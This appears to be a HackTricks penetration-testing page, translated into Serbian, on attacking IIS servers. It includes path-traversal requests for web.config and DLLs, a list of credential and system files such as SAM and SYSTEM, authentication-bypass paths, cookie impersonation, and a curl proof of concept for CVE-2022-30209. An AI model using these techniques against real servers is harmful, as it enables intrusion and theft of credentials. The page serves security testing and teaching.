# IIS - Internet Information Services

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Testirajte ekstenzije izvr≈°nih datoteka:

* asp
* aspx
* config
* php

## Otkriƒáe interne IP adrese

Na bilo kojem IIS serveru gde dobijete 302, mo≈æete poku≈°ati da uklonite Host header i koristite HTTP/1.0, a unutar odgovora Location header mo≈æe ukazivati na internu IP adresu:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Odgovor koji otkriva unutra≈°nju IP adresu:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Izvr≈°avanje .config datoteka

Mo≈æete uƒçitati .config datoteke i koristiti ih za izvr≈°avanje koda. Jedan od naƒçina da to uradite je dodavanje koda na kraj datoteke unutar HTML komentara: [Preuzmite primer ovde](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Vi≈°e informacija i tehnika za iskori≈°ƒáavanje ove ranjivosti [ovde](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Otkriƒáe Bruteforce

Preuzmite listu koju sam kreirao:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

Kreirana je spajanjem sadr≈æaja sledeƒáih lista:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Koristite je bez dodavanja ekstenzije, datoteke koje je zahtevaju veƒá je imaju.

## Putanja Traversal

### Curjenje izvornog koda

Proverite potpuni izve≈°taj na: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
Kao sa≈æetak, postoji nekoliko web.config datoteka unutar foldera aplikacije sa referencama na "**assemblyIdentity**" datoteke i "**namespaces**". Sa ovom informacijom je moguƒáe znati **gde se nalaze izvr≈°ne datoteke** i preuzeti ih.\
Iz **preuzetih Dlls** je takoƒëe moguƒáe pronaƒái **nove namespaces** gde treba poku≈°ati pristupiti i dobiti web.config datoteku kako bi se prona≈°le nove namespaces i assemblyIdentity.\
Takoƒëe, datoteke **connectionstrings.config** i **global.asax** mogu sadr≈æati zanimljive informacije.\\
{% endhint %}

U **.Net MVC aplikacijama**, **web.config** datoteka igra kljuƒçnu ulogu tako ≈°to specificira svaku binarnu datoteku na kojoj aplikacija zavisi putem **"assemblyIdentity"** XML oznaka.

### **Istra≈æivanje Binarnih Datoteka**

Primer pristupa **web.config** datoteci je prikazan u nastavku:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Ovaj zahtev otkriva razne postavke i zavisnosti, kao ≈°to su:

* **EntityFramework** verzija
* **AppSettings** za veb stranice, validaciju klijenata i JavaScript
* **System.web** konfiguracije za autentifikaciju i vreme izvr≈°avanja
* **System.webServer** pode≈°avanja modula
* **Runtime** vezivanja skupova za brojne biblioteke kao ≈°to su **Microsoft.Owin**, **Newtonsoft.Json** i **System.Web.Mvc**

Ove postavke ukazuju na to da se odreƒëene datoteke, kao ≈°to je **/bin/WebGrease.dll**, nalaze unutar /bin fascikle aplikacije.

### **Datoteke u korenskom direktorijumu**

Datoteke pronaƒëene u korenskom direktorijumu, kao ≈°to su **/global.asax** i **/connectionstrings.config** (koja sadr≈æi osetljive lozinke), su kljuƒçne za konfiguraciju i rad aplikacije.

### **Namespaces i Web.Config**

MVC aplikacije takoƒëe defini≈°u dodatne **web.config datoteke** za specifiƒçne namespaces kako bi se izbegle ponavljajuƒáe deklaracije u svakoj datoteci, kao ≈°to je prikazano zahtevom za preuzimanje druge **web.config**:
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **Preuzimanje DLL-ova**

Pominjanje prilagoƒëenog imenskog prostora ukazuje na DLL pod nazivom "**WebApplication1**" prisutan u /bin direktorijumu. Nakon toga, prikazan je zahtev za preuzimanje **WebApplication1.dll**:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Ovo sugeri≈°e prisustvo drugih bitnih DLL-ova, kao ≈°to su **System.Web.Mvc.dll** i **System.Web.Optimization.dll**, u /bin direktorijumu.

U scenariju gde DLL uvozi prostor imena pod nazivom **WebApplication1.Areas.Minded**, napadaƒç mo≈æe da zakljuƒçi o postojanju drugih web.config fajlova na predvidivim putanjama, kao ≈°to su **/area-name/Views/**, koji sadr≈æe specifiƒçne konfiguracije i reference na druge DLL-ove u /bin folderu. Na primer, zahtev za **/Minded/Views/web.config** mo≈æe otkriti konfiguracije i prostore imena koji ukazuju na prisustvo drugog DLL-a, **WebApplication1.AdditionalFeatures.dll**.

### Uobiƒçajeni fajlovi

Sa [ovde](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Gre≈°ka

Ako vidite gre≈°ku poput sledeƒáe:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

To znaƒçi da server **nije primio ispravno ime domena** unutar Host zaglavlja.\
Da biste pristupili web stranici, mo≈æete pogledati **SSL sertifikat** i mo≈æda ƒáete tamo pronaƒái ime domena/subdomena. Ako ga nema, mo≈æda ƒáete morati da **brute force VHosts** dok ne pronaƒëete ispravno.

## Stare IIS ranjivosti koje vredi potra≈æiti

### Microsoft IIS tilde karakter ‚Äú\~‚Äù Ranjivost/Osobina ‚Äì Otkriƒáe kratkog imena datoteke/foldera

Mo≈æete poku≈°ati da **enumeri≈°ete foldere i datoteke** unutar svakog otkrivenog foldera (ƒçak i ako zahteva osnovnu autentifikaciju) koristeƒái ovu **tehniku**.\
Glavno ograniƒçenje ove tehnike, ako je server ranjiv, je to da **mo≈æe pronaƒái samo prvih 6 slova imena svake datoteke/foldera i prva 3 slova ekstenzije** datoteka.

Mo≈æete koristiti [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) da testirate ovu ranjivost:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (844).png>)

Originalno istra≈æivanje: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

Takoƒëe mo≈æete koristiti **metasploit**: `use scanner/http/iis_shortname_scanner`

### Zaobila≈æenje osnovne autentifikacije

**Zaobiƒëite** osnovnu autentifikaciju (**IIS 7.5**) poku≈°avajuƒái da pristupite: `/admin:$i30:$INDEX_ALLOCATION/admin.php` ili `/admin::$INDEX_ALLOCATION/admin.php`

Mo≈æete poku≈°ati da **kombinujete** ovu **ranjivost** i prethodnu da pronaƒëete nove **foldere** i **zaobiƒëete** autentifikaciju.

## ASP.NET Trace.AXD omoguƒáeno debagovanje

ASP.NET ukljuƒçuje re≈æim debagovanja i njegova datoteka se zove `trace.axd`.

Ona ƒçuva veoma detaljan zapis svih zahteva upuƒáenih aplikaciji tokom odreƒëenog vremenskog perioda.

Ove informacije ukljuƒçuju IP adrese udaljenih klijenata, ID sesija, sve kolaƒçiƒáe zahteva i odgovora, fiziƒçke putanje, informacije o izvoru koda, i potencijalno ƒçak i korisniƒçka imena i lozinke.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Kolaƒçiƒá

ASPXAUTH koristi sledeƒáe informacije:

* **`validationKey`** (string): heksadecimalno kodirani kljuƒç za kori≈°ƒáenje u validaciji potpisa.
* **`decryptionMethod`** (string): (podrazumevano ‚ÄúAES‚Äù).
* **`decryptionIV`** (string): heksadecimalno kodirani inicijalizacijski vektor (podrazumevano vektor nula).
* **`decryptionKey`** (string): heksadecimalno kodirani kljuƒç za kori≈°ƒáenje u dekripciji.

Meƒëutim, neki ljudi ƒáe koristiti **podrazumevane vrednosti** ovih parametara i koristiƒáe kao **kolaƒçiƒá email korisnika**. Stoga, ako mo≈æete pronaƒái web sa **istom platformom** koja koristi ASPXAUTH kolaƒçiƒá i **napravite korisnika sa emailom korisnika kojeg ≈æelite da imitirate** na serveru pod napadom, mo≈æda ƒáete moƒái da **koristite kolaƒçiƒá sa drugog servera na prvom** i imitirate korisnika.\
Ovaj napad je uspeo u ovom [**izve≈°taju**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## IIS Zaobila≈æenje autentifikacije sa ke≈°iranim lozinkama (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Potpuni izve≈°taj ovde](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): Gre≈°ka u kodu **nije pravilno proverila lozinku koju je dao korisnik**, tako da ƒáe napadaƒç ƒçija **hash lozinka odgovara kljuƒçu** koji je veƒá u **ke≈°u** moƒái da se prijavi kao taj korisnik.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
{% hint style="success" %}
Uƒçite i ve≈æbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Uƒçite i ve≈æbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈æite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
